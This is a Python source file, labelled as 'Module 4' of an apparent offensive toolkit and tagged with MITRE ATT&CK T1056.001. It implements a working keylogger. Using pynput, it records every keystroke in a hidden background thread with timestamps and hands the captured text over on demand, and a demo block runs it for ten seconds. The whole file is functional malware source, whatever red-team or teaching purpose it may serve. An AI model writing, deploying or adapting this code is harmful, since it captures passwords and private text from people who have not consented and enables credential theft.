"""
Module 4: Keylogger
MITRE ATT&CK: T1056.001 (Input Capture: Keylogging)
Captures keystrokes in background and returns buffer on demand.
"""

import threading
from datetime import datetime
from pynput import keyboard


class Keylogger:
    def __init__(self):
        self.log_buffer = []
        self.current_window = "unknown"
        self.listener = None
        self.running = False
        self._lock = threading.Lock()

    def _on_press(self, key):
        """Callback for each keypress."""
        if not self.running:
            return False

        try:
            key_str = key.char if key.char else str(key)
        except AttributeError:
            key_map = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "[ENTER]\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.shift: "",
                keyboard.Key.ctrl_l: "",
                keyboard.Key.ctrl_r: "",
                keyboard.Key.alt_l: "",
                keyboard.Key.alt_gr: "",
                keyboard.Key.caps_lock: "[CAPS]",
            }
            key_str = key_map.get(key, f"[{key}]")

        if key_str:
            with self._lock:
                self.log_buffer.append({
                    "key": key_str,
                    "timestamp": datetime.now().isoformat()
                })

    def start(self):
        """Start the keylogger in a background thread."""
        if self.running:
            return

        self.running = True
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.daemon = True
        self.listener.start()

    def stop(self):
        """Stop the keylogger."""
        self.running = False
        if self.listener:
            self.listener.stop()

    def get_and_clear_buffer(self):
        """Return captured keystrokes and clear the buffer."""
        with self._lock:
            data = {
                "keystroke_count": len(self.log_buffer),
                "text": "".join(k["key"] for k in self.log_buffer),
                "timestamp": datetime.now().isoformat()
            }
            self.log_buffer.clear()
        return data


if __name__ == "__main__":
    import time
    kl = Keylogger()
    kl.start()
    print("Keylogger running for 10 seconds... type something!")
    time.sleep(10)
    data = kl.get_and_clear_buffer()
    kl.stop()
    print(f"Captured {data['keystroke_count']} keystrokes:")
    print(f"Text: {data['text']}")
